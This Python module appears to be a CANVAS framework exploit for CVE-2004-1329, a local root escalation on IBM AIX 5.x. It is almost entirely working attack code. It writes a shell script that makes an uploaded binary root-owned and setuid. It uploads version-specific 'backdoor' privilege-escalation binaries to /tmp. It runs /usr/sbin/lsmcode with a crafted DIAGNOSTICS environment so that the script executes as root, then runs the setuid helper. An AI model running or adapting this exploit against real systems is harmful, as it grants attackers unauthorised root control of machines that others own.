#!/usr/bin/env python

# AIXroot is a multiheaded (HYDRA!?) local root gettermathingabob for AIX 5.x

import sys
import os
import struct

if '.' not in sys.path:
    sys.path.append('.')

from canvasexploit import canvasexploit
from ExploitTypes.localexploit import LocalExploit
from exploitutils import *

import aixShellcodeGenerator

NAME                                = 'CVE-2004-1329: DIAGNOSTICS environment handling'
VERSION                             = '1.0'
DESCRIPTION                         = 'Local privilege escalation for AIX 5.x'

DOCUMENTATION                       = {}
DOCUMENTATION['VENDOR']             = 'IBM'
DOCUMENTATION['Repeatability']      = 'unlimited'
DOCUMENTATION['VersionsAffected']   = '5.X'
DOCUMENTATION['CVE Name']           = 'CVE-2004-1329'
DOCUMENTATION['CVE URL']            = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1329'
DOCUMENTATION['CVSS'] = 7.2

PROPERTY                            = {}
PROPERTY['TYPE']                    = 'Exploit'
PROPERTY['SITE']                    = 'Local'
PROPERTY['ARCH']                    = [ ['AIX', 'powerpc'] ]
PROPERTY['VERSION']                 = [ '5.X' ]

class CVE_2004_1329:
    def __init__(self, parent, target = '5.2'):
        self.description    = 'DIAGNOSTICS environment handling local root'
        self.t_path         = '/usr/sbin/lsmcode'
        self.target         = target
        self.log            = parent.log
        self.fd             = parent.node.shell.fd
       
        # the binary you want uploaded and executed as root ...
        self.versions       = { '5.1' : 'backdoors/aix51_privesc', 
                                '5.2' : 'backdoors/aix52_privesc',
                                '5.3' : 'backdoors/aix53_privesc'  }
        return
        
    def upload_binary(self, node, code, filename):
        O_RDWR  = node.shell.libc.getdefine('O_RDWR')
        O_CREAT = node.shell.libc.getdefine('O_CREAT')
        node.shell.unlink(filename)
        fd = node.shell.open(filename, O_RDWR|O_CREAT, 0777)
        if fd < 0:
            self.log("couldn't open %s..." % filename)
            return False
        self.log("%s opened as fd=%d" % (filename, fd))
        # be safe and chunnk it up (> 16 bit sizes blows up our PPC assembler :P)
        i   = 0
        SZ  = 0x1000
        while len(code) >= SZ:
            self.log("writing data chunk.")
            r = node.shell.write(fd, code[:SZ])
            if r != 1:
                self.log("write failed.")
                return False
            code = code[SZ:]
        if len(code):
            self.log("writing final chunk.")
            r = node.shell.write(fd, code)
            if r != 1:
                self.log("write.failed.")
                return False
        self.log("file wrote successfully")
        r = node.shell.close(fd);
        if r == -1:
            self.log("error while trying to close the fd")
        return True
    
    def exploit(self, node):
        """ trigger the mosdef exploit execve """

        # first mkdir /tmp/.canvas/bin
        node.shell.mkdir('/tmp/.canvas')
        node.shell.mkdir('/tmp/.canvas/bin')
        
        try:
            binary = open(self.versions[self.target], 'rb+').read()
        except:
            self.log("error opening %s (not available?)" % self.versions[self.target])
            return False

        # upload Dctrl script
        script = ''
        script += '#!/bin/sh\n'
        script += 'chown root:system /tmp/.x\n'
        script += 'chmod +s /tmp/.x\n'
        if not self.upload_binary(node, script, '/tmp/.canvas/bin/Dctrl'):
            self.log("error uploading Dctrl script")
            return False
        
        # upload privesc binary
        if not self.upload_binary(node, binary, '/tmp/.x'):
            self.log("error uploading privesc binary")
            return False
        
        x_vars              = {}
        x_vars['ENV']       = 'DIAGNOSTICS=/tmp/.canvas'
        x_vars['TARGET']    = self.t_path       
        x_code              = """
        #import "local", "execve" as "execve"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "waitpid" as "waitpid"
        #import "local", "getpid" as "getpid"
        #import "local", "_exit" as "_exit"

        #import "string", "ENV" as "ENV"
        #import "string", "TARGET" as "TARGET"
        
        int
        main()
        {
            char *exec[2];
            char *env[25];
            int pid;
            int status;
            int ret;
            
            exec[0] = TARGET;
            exec[1] = 0;
            
            // baby bugs need loving environments
            env[0] = ENV;
            env[1] = "PATH=/usr/bin:/etc:/usr/sbin:/usr/ucb:/usr/bin/X11:/sbin:.";
            env[2] = "ITECONFIGSRV=/etc/IMNSearch";
            env[3] = "AUTHSTATE=compat";
            env[4] = "SHELL=/bin/bash";
            env[5] = "TERM=xterm";
            env[6] = "DOCUMENT_SERVER_MACHINE_NAME=localhost";
            env[7] = "LOCPATH=/usr/lib/nls/loc";
            env[8] = "USER=root";
            env[9] = "ODMDIR=/etc/objrepos";
            env[10] = "LOGIN=root";
            env[11] = "ITE_DOC_SEARCH_INSTANCE=search";
            env[12] = "PWD=/tmp";
            env[13] = "DOCUMENT_SERVER_PORT=49213";
            env[14] = "ITECONFIGCL=/etc/IMNSearch/clients";
            env[15] = "LANG=en_US";
            env[16] = "TZ=CST6CDT";
            env[17] = "SHLVL=1";
            env[18] = "HOME=/tmp";
            env[19] = "LC__FASTMSG=true";
            env[20] = "LOGNAME=evil";
            env[21] = "DOCUMENT_DIRECTORY=/usr/docsearch/html";
            env[22] = "CGI_DIRECTORY=/var/docsearch/cgi-bin";
            env[23] = "NLSPATH=/usr/lib/nls/msg/%L/%N:/usr/lib/nls/msg/%L/%N.cat";
            env[24] = 0;
            
            sendint(0);
            
            pid = fork();
            
            if (pid)
            {
                status  = 1;
                ret     = waitpid(&status, pid, 0);
            }
            else
            {
                execve(exec[0], exec, env);
                _exit(0);
            }
        }
        """
        
        try:
            ret = node.shell.runCode(x_code, x_vars)
        except:
            self.log("something bad happened!")
            import traceback
            traceback.print_exc(file=sys.stdout)
            return False
        
        # exec the privesc helper
        p_vars              = {}
        p_vars['TARGET']    = "/tmp/.x";
        p_vars['FD']        = "%d" % self.fd
        p_code              = """
        #import "local", "execve" as "execve"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "waitpid" as "waitpid"
        #import "local", "getpid" as "getpid"
        #import "local", "_exit" as "_exit"

        #import "string", "TARGET" as "TARGET"
        #import "string", "FD" as "FD"
        
        int
        main()
        {
            char *exec[3];
            int pid;
            int status;
            int ret;
            
            exec[0] = TARGET;
            exec[1] = FD;
            exec[2] = 0;
            
            sendint(0);
            
            pid = fork();
            
            if (pid)
            {
                status  = 1;
                ret     = waitpid(&status, pid, 0);
            }
            else
            {
                execve(exec[0], exec, 0);
                _exit(0);
            }
        }
        """
        
        try:
            ret = node.shell.runCode(p_code, p_vars)
        except:
            self.log("something bad happened!")
            import traceback
            traceback.print_exc(file=sys.stdout)
            return False
        
        self.log("### Remember to cleanup! (/tmp/.canvas, /tmp/.x) ###")
        
        # disable call stack errno support on stuff that mangles the stack
        node.shell.errno = False
        
        return node
    
class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = "AIXrooter exploit"
    
    def run(self):
        self.log("*** this module is used from within the AIXrooter ***")
        return False
    
